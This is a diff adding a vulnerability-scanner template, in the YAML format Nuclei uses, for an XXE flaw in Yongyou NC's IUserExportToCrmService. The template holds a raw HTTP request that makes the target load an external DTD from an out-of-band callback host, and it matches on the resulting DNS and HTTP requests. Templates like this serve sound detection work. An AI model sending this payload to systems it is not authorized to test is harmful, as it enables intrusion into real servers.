@@ -1,0 +1,28 @@
+id: yongyou-nc-iuserexporttocrmservice-xxe
+info:
+  name: Yongyou NC IUserExportToCrmService XXE
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+  description: |
+    XXE vulnerability in Yongyou NC IUserExportToCrmService allowing external entity injection.
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /uapws/service/nc.itf.bd.crm.IUserExportToCrmService?xsd=http://{{reverse}}/ext.dtd HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "ext.dtd"
